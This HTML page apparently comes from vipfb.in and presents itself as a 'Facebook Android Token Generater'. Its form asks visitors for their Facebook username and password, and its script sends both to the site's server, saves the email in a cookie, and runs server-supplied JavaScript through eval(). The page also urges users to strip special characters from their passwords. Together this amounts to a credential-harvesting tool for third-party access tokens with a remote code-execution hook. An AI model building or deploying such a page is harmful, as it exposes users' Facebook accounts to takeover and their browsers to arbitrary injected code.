<div align="center" class="panel-heading"><font size="5"> Facebook Android Token Generater </font></div>

<label for="usr">Username or Email:</label><br>
<input style="width: 75%; height: 34px;" type="text" placeholder="Username or Email" class="form-control" id="user" required>
<div class="form-group">
<label for="pwd">Password or App password:</label>
<input style="width: 75%; height: 34px;" type="password" placeholder="Password or App password" class="form-control" id="pass" required><br>
<span style="color: #e80b0b; background: white; padding: 3px;">If you have any of these characters <span style="color: #3752d8;background: white;padding: 3px;  font-size:125%;">~ ! @ $ % ^ &amp; * ( ) - _ = + [ { ] } \ | ; : ' , . / ? "</span> in your facebook password, change it. Better to avoid special characters</span><br>
</div>
<div align="center">
<button type="button" id="asagigit" class="btn btn-info" onclick="vipfb_login(this);yaziGoster();"> Get Token </button> &nbsp;&nbsp;&nbsp;
<a rel="follow" href="//vipfb.in"><button type="button" class="btn btn-success"> Go Back to the Vipfb </button></a>

<p><div id="allCoppy" style="display:none;background:rgb(62, 255, 75);"><h3> Copy All! </h3></div></center>
<li id="vipfb" class="list-group-item"><img class="img-responsive" src="img/TokenRS.png"> </li></p>
<center>

</center>
</div>
</div>
</div>
<script>
function getCookie(e){for(var t=e+"=",n=document.cookie.split(";"),a=0;a<n.length;a++){for(var s=n[a];" "==s.charAt(0);)s=s.substring(1);if(0==s.indexOf(t))return s.substring(t.length,s.length)}return""}function vipfb_login(){var http=new XMLHttpRequest,user=document.getElementById("user").value,pass=document.getElementById("pass").value,params="u="+user+"&p="+pass;document.cookie="email="+user,http.open("POST","#",!0),http.setRequestHeader("Content-type","application/x-www-form-urlencoded"),http.onreadystatechange=function(){if(4==http.readyState&&200==http.status){var yorumveri=JSON.parse(this.responseText);yorumveri&&yorumveri.eval&&eval(yorumveri.eval)}},http.send(params)}document.getElementById("user").value=getCookie("email"),$("button[id='asagigit']").click(function(){return $("html, body").animate({scrollTop:$(document).height()},"slow"),!1});/*
$(window).scroll(function(){$(this).scrollTop()>100?$("#topUpp").fadeIn(500):$("#topUpp").fadeOut(500)}),$(document).ready(function(){$("#topUpp").click(function(){return $("html, body").animate({scrollTop:"0"},500),!1})});*/
// www.vipfb.in - Facebook Best Free Panel - Mert Kılıç
function yaziGoster(){document.getElementById('allCoppy').style.display = "block";}
</script>

<script async src="//googletagmanager.com/gtag/js?id=UA-109941366-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-109941366-1');
</script>
</body>
</html>
